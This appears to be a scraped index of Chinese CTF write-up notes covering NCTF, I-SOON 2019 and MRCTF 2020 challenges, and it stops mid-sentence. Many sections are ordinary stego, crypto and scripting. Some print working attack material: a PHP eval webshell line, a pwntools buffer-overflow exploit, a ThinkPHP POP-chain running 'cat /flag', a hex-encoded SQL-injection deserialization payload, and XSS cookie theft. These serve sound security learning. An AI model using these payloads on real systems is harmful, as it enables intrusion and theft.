PHPSESSID=6vtpnnca8f9mjjde768sqiub4g Upgrade-Insecure-Requests: 1 sub=text&pat=e&rep=readfile(chr(47).chr(102).chr(108).chr(97).chr(103)); 0x07 flask 大佬队员，躺赢。。。。。 0x08 Upload your Shell 翻了一下网页就只有 index.php?action=imgs.html 有注入点 然后想着上传一个图片马 直接写一句话改后缀名不行 看起来他是要读文件头的 并且拦截了 @eval($_POST[a]); 刚准备用菜刀的结果告诉我一个服务器上自带的图片马的地址 用自带的action参数解析成php就完事了 payload: /index.php?action=/var/www/html/upload-imgs/321fab94ed3f1e1fba698ddda303566a/Th1s_is_a_fl4g.jpg 0x09 flask_website 大佬队友带我躺赢。。。。。 0x0A simple_xss 据队友说是个入门向xss 在http://xsspt.com/生成一段xss 发给admin 过一会就会得到admin的cookie 然后就能拿到flag...... 0x0B hacker_backdoor 大佬队友带我躺赢。。。。。+2 0x0C tsb tsb->bst ..... 0x0D 难看的代码 大佬队友带我躺赢。。。。。+3 0x0E 签到题 大佬队友带我躺赢。。。。。+4 0x0F DEBUG 真就IDA 动态调试。。。。。 因为 for ( i = 0; i 进循环时s就计算好了 然后下个断点直接看栈就好了 0x10 Our 16bit Games 大佬队友带我躺赢。。。。。+5 0x11 Easy Ternary 大佬队友带我躺赢。。。。。+6 0x12 你大概需要一个带bar的mac 无设备引起不适。。。 过 0x13 math_easy math.....easy?...... 过....... 0x14 hello_pwn nc 题。。。。。 #coding=utf-8 from pwn import * io=remote(\"139.129.76.65\",\"50003\") io.interactive() 0x15 pwn me 100 years! (I) checksec 看一下 Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 没开Canary和PIE， 要满足两个条件 直接栈溢出就完事了 #coding=utf-8 from pwn import * payload=\"yes\\x00\"+'a'*(0x10-0x4)+p64(0x66666666) io=remote(\"139.129.76.65\",\"50004\") io.sendafter(\"ready?\\n\",payload) io.interactive() 0x16 pwn me 100 years! (II) 漏洞：栈上变量未初始化导致第一个函数里的buf就是第二个函数的&dest 然后可以用第二个函数的printf格式化漏洞 但是checksec告诉我们 Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 开了PIE.... 还得泄露基址。。 最后没能整出来，还是要好好学。。。。。 0x17 ~ 0x1C(pwn) 0x17没做出来，心态爆炸。。。。。 0x1D Keyboard 九宫格输入法。。。。。。 好像把所有不一样的表示换成不同字幕跑quipquip也能过。。。。。 0x1E~0x21 (Crypto) 我，数学学术垃圾，过....... 0x22 a_good_idea foremost+stegsolve(image Combiner) 得到一张二维码，扫描得到flag 0x23 Become a Rockstar 看文风有点奇怪。。。。像是编程语言。。。 搜了一下有没有诗歌一样的编程语言 发现Rockstar语言 用Rockstar-js 没跑出来暂时放弃了 结果Rockstar-py可以跑出来 Leonard_Adleman = \"star\" Problem_Makers = 76 Problem_Makers = \"NCTF{\" def God(World): a_boy = \"flag\" the_boy = 3 def Evil(your_mind): a_girl = \"no flag\" the_girl = 5 Truths = 3694 Bob = \"ar\" Adi_Shamir = \"rock\" def Love(Alice, Bob): Mallory = 13 Mallory = 24 Everything = 114514 Alice = \"you\" def Reality(God, Evil): God = 26 Evil = 235 Ron_Rivest = \"nice\" def You_Want_To(Alice, Love, Anything): You = 5.75428 your_heart = input() You = 5 your_mind = input() Nothing = 31 if Truths * Nothing == Everything: RSA = Ron_Rivest + Adi_Shamir + Leonard_Adleman if Everything / Nothing == Truths: Problem_Makers = Problem_Makers + Alice + Bob print(Problem_Makers) the_flag = 245 the_confusion = 244 print(RSA) Mysterious_One = \"}\" print(Mysterious_One) This = 4 This = 35 This = 7 This = 3 This = 3 This = 37 0x24 Bright Body I 虚幻引擎好游戏啊！（然而手残。。。。。 巅峰极客Nijia留下的心理阴影 以为要用逆向代码啥的 结果最后是在pak里直接strings就能出来的题目。。。。。 strings /mnt/c/Users/Eki/Desktop/Bright\\ Body\\ I/Bright\\ Body\\ I/Magic/Content/Paks/Magic-WindowsNoEditor.pak |grep NCTF* 0x25 有内鬼,终止交易 一个ss协议流量分析题 　　一、针对wireshark最常用的自然是针对IP地址的过滤。其中有几种情况： 　　 表达式为：ip.src == 192.168.0.1 　　（2）对目的地址为192.168.0.1的包的过滤，即抓取目的地址满足要求的包。 　　 表达式为：ip.dst == 192.168.0.1 　　（3）对源或者目的地址为192.168.0.1的包的过滤，即抓取满足源或者目的地址的ip地址是192.168.0.1的包。 　　 表达式为：ip.addr == 192.168.0.1,或者 ip.src == 192.168.0.1 or ip.dst == 192.168.0.1 　　（4）要排除以上的数据包，我们只需要将其用括号囊括，然后使用 \"!\" 即可。 　　 表达式为：!(表达式) 　　二、针对协议的过滤 　　（1）仅仅需要捕获某种协议的数据包，表达式很简单仅仅需要把协议的名字输入即可。 ​ 表达式为：http 　　（2）需要捕获多种协议的数据包，也只需对协议进行逻辑组合即可。 　　 表达式为：http or telnet （多种协议加上逻辑符号的组合即可） 　　（3）排除某种协议的数据包 　　 表达式为：not arp !tcp 　　三、针对端口的过滤（视协议而定） 　　（1）捕获某一端口的数据包 　　 表达式为：tcp.port == 80 　　（2）捕获多端口的数据包，可以使用and来连接，下面是捕获高端口的表达式 　　 表达式为：udp.port >= 2048 　　四、针对长度和内容的过滤 　　（1）针对长度的过虑（这里的长度指定的是数据段的长度） 　　 表达式为：udp.length 　　（2）针对数据包内容的过滤 　　　　 表达式为：http.request.uri matches \"vipscu\" （匹配http请求中含有vipscu字段的请求信息） config.json泄露了加密方法、密钥和主机地址 用ss的源码里的脚本直接跑解密 人肉分析了半个下午，心态爆炸。。。。。 分析不出来， 由于客户端和服务端发送包都经过了加密，不能整个导出进行解密，需分开解密 ...... 最后找到是在这个TCP包里。。。 0x26 小狗的秘密 流量分析套路题 用Wireshark导出HTTP对象 最大的一个1.html里有很奇妙的东西类似 (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255)..... 盲猜是RGB像素点，把格式改一下用下面的脚本导出图像 #coding=utf-8 from PIL import Image x = 500 #x坐标 通过对txt里的行数进行整数分 y = 100 #y坐标 x * y = 行数 im = Image.new(\"RGB\", (x, y)) file = open('1.html') for i in range(0, x): for j in range(0, y): line = file.readline() #获取一行的rgb值 rgb = line.split(\", \") #分离rgb，文本中逗号后面有空格 im.putpixel((i, j), (int(rgb[0]), int(rgb[1]), int(rgb[2]))) im.save('flag.jpg') 0x27 键盘侠 下载一个zip伪加密 里面一张大的不科学的图 直接上foremost 得到一个docx 说是隐藏字符 打开docx隐藏字符显示 得到这么一串东西 PD4~idqQC|WjHloX>)UPb8~ZFb8laGczAeteE 想了很久。。 甚至打开xml发现密文分三段。。。还有个hint:eastAsia 以为是某种多表代换？ 最后也没做出来 结果最后告诉我是个base85.......... python3 >>> import base64 >>> base64.b85decode('PD4~idqQC|WjHloX>)UPb8~ZFb8laGczAeteE') b'NCTF{Ba3e85_issssss_so_xxxxx}' 0x28 What's this WireShark找到大文件点导出字节流存储为zip 发现还是个伪加密 里面一堆base64 多行的解不出来，应该就是base64隐写了 跑一下脚本就得到flag.... (一开始可能复制错了结果没跑出来。。。。。) 0x29 2077 点开一看发现是2077的“官方”解密视频 应该会有大佬解过 所以Google Cyberpunk 2077 stream decode. 然后找到一个帖子 https://www.reddit.com/r/pcgaming/comments/9an6mn/cd_projekt_red_twitch_live_with_cyberpunk_2077/ ，解密结果是一张图 下载后用 sha256sum 命令求 sha256 值即可。 0x2A pip install 直接把pip 下下来的包拿来分析 里面有一串神奇的编码。。。。 tmp_file = tempfile.gettempdir() + path.sep + '.f14g_is_here' f = open(tmp_file, 'w') f.write('TkNURntjNHJlZnVsX2FiMHU3X2V2MWxfcGlwX3A0Y2thZ2V9') f.close() 用base64就能解码出来 © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"contest/isoon-2019.html":{"url":"contest/isoon-2019.html","title":"ISOON 2019","keywords":"","body":"I-SOON 2019 Log0x00 前言0x01 吹着贝斯扫二维码0x02 music0x03 Attack0x04 funny-php0x05 easy_serialize_php (赛后复现)I am thinking(赛后复现)参考资料不是文件上传（赛后复现）I-SOON 2019 Log 0x00 前言 一场十分艰难的比赛。。。。 web pwn无头绪 时间全花在misc上了 还实力眼瞎了好几次。。。。。 最后只拿到了rank 40...... 道阻且长 收货 wireshark 流量分析的进阶过滤操作 mimikatz64工具的使用 Todo php curl 操作 request 写exp.... ....一堆要补的web知识 0x01 吹着贝斯扫二维码 看文件头是一堆jpg，发现要拼图。。。。。 根据四个定位定位标识的加一些边框把二维码拼出来拿到解密方法 BASE Family Bucket ??? 85->64->85->13->16->32 把zip文件的注释按照得到的解密方法解一遍就完事了 0x02 music 根据提示信息拿mp3stego用密钥接触压缩包密码 密码是123qwe123 然后用silenteye对压缩包里的wav进行分析，是个音频的LSB隐写 0x03 Attack 流量分析， tcp.stream eq 824拿到一个zip包里面有flag.txt 提示Administrator的密码 tcp.stream eq 833拿到dmp file一下是个minidump mimikatz64 可以对其进行分析得到所有用户的密码 用Adminstrator的密码解密 0x04 funny-php 逆向题 function encode($str){ $str1=array(); $str1=unpack(\"C*\",$str); for($_0=0;$_0 比赛的时候只写了个部分解密的脚本 function decode($chiper){ $_ftmp=''; $_=''; $str=''; $_d=array(); $__=base64_decode(str_rot13(strrev($chiper))); print($__.''); for($i=0;$i0){ if(base64_decode($__)%100==0&&base64_decode($__)!=NULL){ $__=base64_decode($__); } $_ftmp=substr($__,strlen($__)-1,1).$_ftmp; $__=substr($__,0,strlen($__)-1); } //$_ftmp=$__; print($_ftmp.''); for($i=0;$i'); $str1=array(); $str1=explode(';',$_); $str=pack(\"C*\",$str1); return $str;*/ } 在 for($_0=0;$_0之前得到这么一串数字 10210897103123101971151219510111099111100101125 根据ascii码的特征分割一下 #include char str[]={102,108,97,103,123,101,97,115,121,95,101,110,99,111,100,101,125,0}; int main(){ printf(str); return 0; } 0x05 easy_serialize_php (赛后复现) 给了源码 source_code'; } if(!$_GET['img_path']){ $_SESSION['img'] = base64_encode('guest_img.png'); }else{ $_SESSION['img'] = sha1(base64_encode($_GET['img_path'])); } $serialize_info = filter(serialize($_SESSION)); if($function == 'highlight_file'){ highlight_file('index.php'); }else if($function == 'phpinfo'){ eval('phpinfo();'); //maybe you can find something in here! }else if($function == 'show_image'){ $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo['img'])); } 看来是要利用$serialize_info来搞file_get_contents, extract($_POST); 可以用来覆写$_SESSION，但是$_SESSION['img']没法搞，怎么办 还是利用php反序列化长度变化尾部字符串逃逸搞,经过filter后flag->''就可以读到后面的东西了 我们要覆盖的长度为 len('\";s:8:\"function\";s:2:\"a\"') 填充6个flag即可 问题是读什么呢？ 根据提示看一下phpinfo(); 可以看到auto_append_file:d0g3_f1ag.php 读一下试试 构造payload 返回了flag地址，再读一次就可 I am thinking(赛后复现) 其实就是个parse_url的绕过+tp6.0POP TP6.x POP Poc \"system\"]; public function get() { $this->data = [\"eki\" => \"cat /flag\"]; //你想要执行的命令，这里的键值只需要保持和withAttr里的键值一致即可 } } namespace think; abstract class Model{ use model\\concern\\Attribute; use model\\concern\\Conversion; private $lazySave = false; protected $withEvent = false; private $exists = true; private $force = true; protected $field = []; protected $schema = []; protected $connection='mysql'; protected $name; protected $suffix = ''; function __construct(){ $this->get(); $this->lazySave = true; $this->withEvent = false; $this->exists = true; $this->force = true; $this->field = []; $this->schema = []; $this->connection = 'mysql'; } } namespace think\\model; use think\\Model; class Pivot extends Model { function __construct($obj='') { parent::__construct(); $this->name = $obj; } } $a = new Pivot(); $b = new Pivot($a); echo urlencode(serialize($b)); parse_url用///绕过 参考资料 https://www.anquanke.com/post/id/187393 不是文件上传（赛后复现） 页脚提示项目名 在Github上找到源码 既然不是文件上传，那么大概率是在文件名种注入sql或者反序列化等操作 看一下源代码，有serialize和unserialize操作 public function upload($input=\"file\") { $fileinfo = $this->getfile($input); $array = array(); $array[\"title\"] = $fileinfo['title']; $array[\"filename\"] = $fileinfo['filename']; $array[\"ext\"] = $fileinfo['ext']; $array[\"path\"] = $fileinfo['path']; $img_ext = getimagesize($_FILES[$input][\"tmp_name\"]); $my_ext = array(\"width\"=>$img_ext[0],\"height\"=>$img_ext[1]); $array[\"attr\"] = serialize($my_ext);//序列化点 $id = $this->save($array); if ($id == 0){ die(\"Something wrong!\"); } echo \"\"; echo \"Your images is uploaded successfully. And your image's id is $id.\"; } public function Get_All_Images(){ $sql = \"SELECT * FROM images\"; $result = mysqli_query($this->con, $sql); if ($result->num_rows > 0){ while($row = $result->fetch_assoc()){ if($row[\"attr\"]){ $attr_temp = str_replace('\\0\\0\\0', chr(0).'*'.chr(0), $row[\"attr\"]); $attr = unserialize($attr_temp);//反序列化点 } echo \"id=\".$row[\"id\"].\" filename=\".$row[\"filename\"].\" path=\".$row[\"path\"].\"\"; } }else{ echo \"You have not uploaded an image yet.\"; } mysqli_close($this->con); } 反序列化利用链也很显然 利用show的 class helper { protected $folder = \"pic/\"; protected $ifview = False; protected $config = \"config.txt\"; public function view_files($path){ if ($this->ifview == False){ return False; //The function is not yet perfect, it is not open yet. } $content = file_get_contents($path); echo $content; } function __destruct(){ # Read some config html $this->view_files($this->config);//任意文件读 } 先写个反序列化的Exp ifview == False){ return False; //The function is not yet perfect, it is not open yet. } $content = file_get_contents($path); echo $content; } function __destruct(){ # Read some config html $this->view_files($this->config); } } $helper = new Helper(); echo str_replace(chr(0).'*'.chr(0),'\\0\\0\\0',serialize($helper)); ?> 有个要注意的点是根据源码要对生成的payload进行修改 然后怎么把反序列化数据注入呢，这里利用sql进行注入 public function check($info) { $basename = substr(md5(time().uniqid()),9,16); $filename = $info[\"name\"]; $ext = substr(strrchr($filename, '.'), 1); $cate_exts = array(\"jpg\",\"gif\",\"png\",\"jpeg\"); if(!in_array($ext,$cate_exts)){ die(\"Please upload the correct image file!!!\"); } $title = str_replace(\".\".$ext,'',$filename); return array('title'=>$title,'filename'=>$basename.\".\".$ext,'ext'=>$ext,'path'=>$this->folder.$basename.\".\".$ext);//此处title可控 } public function upload($input=\"file\") { $fileinfo = $this->getfile($input); $array = array(); $array[\"title\"] = $fileinfo['title']; $array[\"filename\"] = $fileinfo['filename']; $array[\"ext\"] = $fileinfo['ext']; $array[\"path\"] = $fileinfo['path']; $img_ext = getimagesize($_FILES[$input][\"tmp_name\"]); $my_ext = array(\"width\"=>$img_ext[0],\"height\"=>$img_ext[1]); $array[\"attr\"] = serialize($my_ext);//my_ext $id = $this->save($array); if ($id == 0){ die(\"Something wrong!\"); } echo \"\"; echo \"Your images is uploaded successfully. And your image's id is $id.\"; } public function save($data) { if(!$data || !is_array($data)){ die(\"Something wrong!\"); } $id = $this->insert_array($data); return $id; } public function insert_array($data) { $con = mysqli_connect(\"127.0.0.1\",\"root\",\"root\",\"pic_base\"); if (mysqli_connect_errno($con)) { die(\"Connect MySQL Fail:\".mysqli_connect_error()); } $sql_fields = array(); $sql_val = array(); foreach($data as $key=>$value){ $key_temp = str_replace(chr(0).'*'.chr(0), '\\0\\0\\0', $key); $value_temp = str_replace(chr(0).'*'.chr(0), '\\0\\0\\0', $value); $sql_fields[] = \"`\".$key_temp.\"`\"; $sql_val[] = \"'\".$value_temp.\"'\"; } $sql = \"INSERT INTO images (\".(implode(\",\",$sql_fields)).\") VALUES(\".(implode(\",\",$sql_val)).\")\"; mysqli_query($con, $sql); $id = mysqli_insert_id($con); mysqli_close($con); return $id; } 上传语句为 INSERT INTO images (`title`,`filename`,`ext`,`path`,`attr`) VALUES('test','9f09bc3fd029a211.gif','gif','pic/9f09bc3fd029a211.gif','a:2:{s:5:\"width\";i:256;s:6:\"height\";i:256;}') 构造文件名为 1','1','1','1',0x4f3a363a2268656c706572223a333a7b733a393a225c305c305c30666f6c646572223b733a343a227069632f223b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d),('1.jpg 利用hex绕过字符串单引号限制 效果 INSERT INTO images (`title`,`filename`,`ext`,`path`,`attr`) VALUES('1','1','1','1',0x4f3a363a2268656c706572223a333a7b733a393a225c305c305c30666f6c646572223b733a343a227069632f223b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d),('1.jpg','9f09bc3fd029a211.gif','gif','pic/9f09bc3fd029a211.gif','a:2:{s:5:\"width\";i:256;s:6:\"height\";i:256;}') © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"contest/mrctf-2020.html":{"url":"contest/mrctf-2020.html","title":"MRCTF 2020","keywords":"","body":"MRCTF新生赛 2020前言Misc不眠之夜Unravel飞来横财pyflagcyberpunk!千层套路 Write Upezmisc你能看懂音符吗WebPYWebsiteEz_bypassEzPop套娃Ezaudit你传你&#x1F40E;呢Ezpop RevengeNot So Web ApplicationREXor(校内专供)Transform撸啊撸PixelShooterJunkEasyCPPShitVirtual TreeCryptokeyboard天干地支+甲子babyRSAeasy_RSAreal_random古典密码知多少PWNnothing_but_everythingeasy_equationspfaShellcodeShellcode RevengeMRCTF新生赛 2020 前言 因为原来是准备面向萌新嘛，然后就帮忙出了一些各个方向的签到题（只会出签到题的菜菜）。 RE: 拿很久前编的游戏出了一道Unity apk逆向水题，想着提高比赛趣味性，就没想着怎么整人，很简单的解包分析dll就能出了 PWN: 当时pwn题不太够，然后就出了两个shellcode的题目，灵感也是来自hackergame2019，主要想考察打比赛的时候查资料的能力吧，Googlehack是个好东西 Misc: 出了个压缩套娃题，主要是考察python脚本编写，python还真是好用啊，尽管我还没怎么学通。。。。（留下了没技术的泪水.jpg） Web: 原来就出了Ezpop,感觉Pop链的构造还是比较有逻辑性的，丢了一个学习链接也是为了让这题更有教育意义吧，主要考察一下 比赛现学能力，你传你马呢是Retr_0师傅给的idea，然后我去做了镜像（不得不说写Web题比打Web题难受多了，留下了没技术的眼泪*2），本意就是考察经典的上传绕过，也比较水。鉴于这两题都比较水，后来临时出了Ezpop_Revenge,主要想考察代码审计，然后就选了typecho拿来魔改，正巧typecho有个经典的POP链，为了防止直接被RCE搞并且强行套上SSRF，硬过滤了一堆东西，（后来好像把/var/html/www挂成ro能省一大堆事），导致这题有点搞心态（特别是忘记标注泄露的源码不一定是服务器的代码了），然而大佬并没有给我留Hint的机会，直接切了orz。 Misc 不眠之夜 这是一个不能透露出题人信息的题目... 解法1：手动拼图（逃 解法2：写脚本拼图。通过一些方法（比如边缘的对应像素色差取平方和）计算边缘的相似度，对每个图片对象dfs其四周最相似的图片即可，复杂度(n^3)，2000多像素，常数不大，可以跑。 在使用PIL拼图的时候注意生成原图长宽二倍的图片，从中间一点开始扩展，可以保证不会越界。或者检测红色像素点位置，据此构造边缘特征也可以，但这样容易出现多个强连通分量的情况，最后还要手动拼 （算法dalao请务必把脚本发来看看 解法3：gayhub上的gaps工具。谷歌搜索jigsaw solver可以找到这个工具，两秒就跑出来了。 注意其参数-size代表了分割成正方形块的边长。显然应该取小拼图的长宽最大公因数100 Unravel 首先拿到后binwalk分离图片发现带有aes的Tokyo 然后查看.wav文件尾，发现密文。 利用密码解密的得到另一个.wav 通过silenteye解LSB隐写 得到flag。 飞来横财 pragma solidity >=0.6.1; contract Modcoin { mapping(uint256 => bool) public is_successful; function recvpay() public payable { require(((msg.value / 0.001 ether ) % 2 == 0 && ((msg.value % 0.001 ether) == 0)), \"Not Accepting These Coins.\"); } function getflag(uint256 target) public { require((address(this).balance / 0.001 ether ) % 2 == 1,\"Not Wanted value\"); require(msg.sender.send(address(this).balance)); is_successful[target] = true; } fallback () external payable { require(((msg.value / 0.001 ether ) % 2 == 0 && ((msg.value % 0.001 ether) == 0)), \"Not Accepting These Coins.\"); } } 原合约中两个支付函数recvpay() 和 fallback() 都只允许接受偶数倍0.001 ether的付款，而合约的getflag函数则要求奇数倍 0.001 ether 的合约余额才可以执行（并清空合约余额），这时就需要绕过限制向合约地址发送ether，而合约自毁或挖矿产生的ether是无法拒绝的，可以通过以下自毁合约达到条件。 contract Payassist { function destroy_pay(address payable addr) public payable { selfdestruct(addr); } } pyflag 题目灵感：出题人感觉Misc很多题目有着相同的套路，想要尝试基于特征的隐写自动解决工具...于是就有了题目的最后一部分 拿到题目解压缩后发现三张图片。无论是使用strings命令，还是用16进制编辑器打开图片，都可以发现文件末尾隐藏了一些信息。strings会发现[Secret File Part 1-3]的标识，而16进制打开则发现文件尾的结束符并非jpg的标准结束符FF D9。 于是将这三段隐藏信息复制到16进制编辑器中，可以得到一个压缩包。 压缩包密码是弱密码1234 然后取得了一个flag.txt，.hint已经提示了使用base16,32,64,85的编码，可以编写自动化脚本来处理，也可以手动尝试。只加密了五层，手动尝试不会很耗费时间。编写py脚本这就需要正则表达式的知识，并掌握这些编码的正则特征。 如果你选择编写脚本解码，那么请注意使用的函数传入的参数是str（\"Astring\"）还是bytes(b\"Astring\")。字符流和字节流的区别也很重要，可以去了解一下，明确它们的区别可以让你在数据处理时更加熟练。 #!/usr/bin/env python import base64 import re def baseDec(text,type): if type == 1: return base64.b16decode(text) elif type == 2: return base64.b32decode(text) elif type == 3: return base64.b64decode(text) elif type == 4: return base64.b85decode(text) else: pass def detect(text): try: if re.match(\"^[0-9A-F=]+$\",text.decode()) is not None: return 1 except: pass try: if re.match(\"^[A-Z2-7=]+$\",text.decode()) is not None: return 2 except: pass try: if re.match(\"^[A-Za-z0-9+/=]+$\",text.decode()) is not None: return 3 except: pass return 4 def autoDec(text): while True: if b\"MRCTF{\" in text: print(\"\\n\"+text.decode()) break code = detect(text) text = baseDec(text,code) with open(\"flag.txt\",'rb') as f: flag = f.read() autoDec(flag) 顺便给出我的加密脚本 #!/usr/bin/env python import base64 import re key = \"31214\" # key本来非常长。。似乎太难了改的简单了点 # key = \"14332234124133132214311231\" flag = b\"MRCTF{Y0u_Are_4_p3rFect_dec0der}\" def baseEnc(text,type): if type == 1: return base64.b16encode(text) elif type == 2: return base64.b32encode(text) elif type == 3: return base64.b64encode(text) elif type == 4: return base64.b85encode(text) else: pass def baseDec(text,type): if type == 1: return base64.b16decode(text) elif type == 2: return base64.b32decode(text) elif type == 3: return base64.b64decode(text) elif type == 4: return base64.b85decode(text) else: pass def finalEnc(text,key): nf = text count = 1 for i in key: nf = baseEnc(nf,int(i,10)) #print(\"第\"+str(count)+\"次加密: \",nf) count +=1 return nf def finalDec(text,key): nf = text key = key[::-1] print(key) count = 1 for i in key: nf = baseDec(nf,int(i,10)) #print(\"第\"+str(count)+\"次解密: \",nf) count +=1 return nf def detect(text): try: if re.match(\"^[0-9A-F=]+$\",text.decode()) is not None: return 1 except: pass try: if re.match(\"^[A-Z2-7=]+$\",text.decode()) is not None: return 2 except: pass try: if re.match(\"^[A-Za-z0-9+/=]+$\",text.decode()) is not None: return 3 except: pass return 4 def autoDec(text): print(\"dec key:\",end=\"\") while True: if b\"MRCTF{\" in text: print(\"\\n\"+text.decode()) break code = detect(text) text = baseDec(text,code) print(str(code),end=\"\") fe = finalEnc(flag,key) with open(\"flag.txt\",'w') as f: f.write(fe.decode()) ''' ff = finalDec(fe,key) print(ff) ''' ff = autoDec(fe) 最后flag就是MRCTF{Y0u_Are_4_p3rFect_dec0der} cyberpunk! 签到题。 改时间或者逆向都行。 但是昂哥加了个壳 估计大家都会去改时间吧23333。 千层套路 Write Up 主要考察python脚本编写能力 虽然是千层套娃但是为了不那么毒瘤其实只有两层 第一层，自动化解压zip 试几次就知道zip的解压密码都是对应名字，可以写脚本 #coding=utf-8 import os import zipfile orginal_zip = \"0573.zip\" while True: tag = orginal_zip orginal_zip = zipfile.ZipFile(orginal_zip) for contents in orginal_zip.namelist(): password = contents[0:contents.find('.')] print password orginal_zip.setpassword(tag[:-4]) try: orginal_zip.extractall() except: break if(len(tag)>6): os.system(\"rm \"+tag) orginal_zip=password+\".zip\" 因为博客里有写过相应脚本，这里改了下，解压密码都是对应名字而不是压缩包里名字。有个可能的坑是如果不判断的话，程序跑完会自动把qr.zip也删了 然后第二层就是qr.txt 里面一堆 (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) ... 显然是像素点 用PIL库搞下 #coding=utf-8 from PIL import Image x = 200 #x坐标 通过对txt里的行数进行整数分 y = 200 #y坐标 x * y = 行数 im = Image.new(\"RGB\", (x, y)) file = open('qr.txt') for i in range(0, x): for j in range(0, y): line = file.readline() #获取一行的rgb值 line = line[:-2] line = line[1:] print line rgb = line.split(\", \") #分离rgb，文本中逗号后面有空格 im.putpixel((i, j), (int(rgb[0]), int(rgb[1]), int(rgb[2]))) im.save('flag.png') 拿到二维码，扫一下拿到flag flag=\"MRCTF{ta01uyout1nreet1n0usandtimes}\" ezmisc 下载附件得到一张png图片，在windows下能打开看到，拖进kali中会显示CRC error，由此可以推断 图片的宽度/高度有问题，又因为图片宽度有问题时在windows下无法正常打开图片，所以本题为图片 高度有问题，修改图片高度即可看到flag：MRCTF{1ts_vEryyyyyy_ez!} 附上有关CRC错误的隐写分析网址：https://www.bbsmax.com/A/gVdnlMVXJW/ ctfwiki中也有很详细的介绍：https://ctf-wiki.github.io/ctf-wiki/misc/picture/png-zh/ 你能看懂音符吗 下载附件，解压时报错，放进winhex查看，发现rar文件头错误，将6152修改为5261后再解压，即 可得到一个word文档，打开后发现内容被隐藏，搜索word隐写可知其隐写方式，将被隐藏的内容显 示出来，得到一串音符，在线网址解密音符即可得到flag word隐写方式（供参考）：https://blog.csdn.net/q_l_s/article/details/53813971 解密网址：https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue flag：MRCTF{thEse_n0tes_ArE_am@zing~} Web PYWebsite 一道简单的前端trick题目，希望更多人注意到前端验证是不安全的。 首先过一遍业务逻辑，是购买授权码，再验证授权码的过程。自然想到审计验证过程的漏洞。点击按钮弹出窗口是js控制的，进而猜测验证逻辑处于前端，于是查看源代码发现逻辑如下: 不知道MD5？事实上我们根本不需要理会前端的验证，只需要直接跳转到flag.php即可。 （md5(\"ARandomString\")） 进入flag.php，题目告诉我们只有特定的IP才能访问，并且是后端验证。事实上，应用层使用XFF验证IP也是没有意义的。PHP使用X-Forward-For这个http的请求头来验证，而这个请求头我们可以伪造。 我们不知道购买者的IP，但是知道“自己”的IP，也就是本地环回地址127.0.0.1。因此只需要用抓包软件抓到HTTP的请求包，进行修改（加入X-Forwarded-For: 127.0.0.1一行）就可以欺骗过验证逻辑。 最后的flag字体我调成了白色hhh 所以要多观察源代码 后端的验证逻辑一般如下： function checkXFF() { if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])) { $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; if (strpos($ip, \"127.0.0.1\") !== false) { return true; } } return false; } 顺便一提，如何验证用户的真实IP呢？确实不好办。因为用户可能使用代理（称为正向代理），我们的服务器因为业务需求，也会进行负载均衡等转发操作（称为反向代理）。但如果这个过程没有经过代理，一般使用Remote_Addr是可以获得真实IP的。 flag:MRCTF{Ba1_Pia0_Flag_1s_ve7y_H4PPY!} Ez_bypass 很简单的bypass 第一步md5好多种绕过方法。 可以当数组，可以当md5碰撞，可以构造0e开头科学计数法。 第二步用语句绕过 1234567|1=1 即可得到flag 比较简单 EzPop 主要考察对php魔术化方法的了解 提示里有参考资料，也是为了锻炼赛场上的自学能力吧 考点就这三个 反序列化魔术方法 __construct()//当一个对象创建时被调用 __destruct() //当一个对象销毁时被调用 __toString() //当一个对象被当作一个字符串使用 __sleep()//在对象在被序列化之前运行 __wakeup()//将在反序列化之后立即被调用(通过序列化对象元素个数不符来绕过) __get()//获得一个类的成员变量时调用 __set()//设置一个类的成员变量时调用 __invoke()//调用函数的方式调用一个对象时的回应方法 __call()//当调用一个对象中的不能用的方法的时候就会执行这个函数 public、protected与private在序列化时的区别 protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上\\0\\0的前缀。这里的 \\0 表示 ASCII 码为 0 的字符(不可见字符)，而不是 \\0 